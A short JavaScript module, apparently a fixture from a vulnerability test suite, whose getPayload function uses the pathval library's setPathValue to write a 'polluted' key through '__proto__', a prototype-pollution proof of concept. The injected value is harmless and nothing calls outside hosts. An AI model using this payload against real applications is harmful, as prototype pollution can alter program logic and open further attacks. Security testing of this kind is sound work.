function getPayload() {
    var pathval = require("pathval");

    var obj = {};
    pathval.setPathValue(obj, "__proto__.polluted", "yes");
    return { obj };
}

module.exports = { getPayload };